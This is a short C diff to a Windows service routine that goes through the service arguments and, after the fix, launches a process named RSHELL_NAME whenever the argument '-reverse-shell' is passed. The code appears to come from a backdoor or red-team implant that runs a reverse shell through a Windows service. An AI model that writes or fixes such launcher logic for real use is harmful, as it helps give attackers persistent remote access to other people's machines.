@@ -64,7 +64,7 @@ BYTE launchProcesses(DWORD dwNumServicesArgs, LPWSTR *lpServiceArgVectors) {
 		return (FAILURE);
 
 	for (DWORD i = 0; i < dwNumServicesArgs; i++) { // Verification de success ?
-		if (wcscmp(lpServiceArgVectors[i], RSHELL_NAME))
+		if (!wcscmp(lpServiceArgVectors[i], L"-reverse-shell"))
 			launchGenericProcess(RSHELL_NAME);
 	}
 	return (SUCCESS);
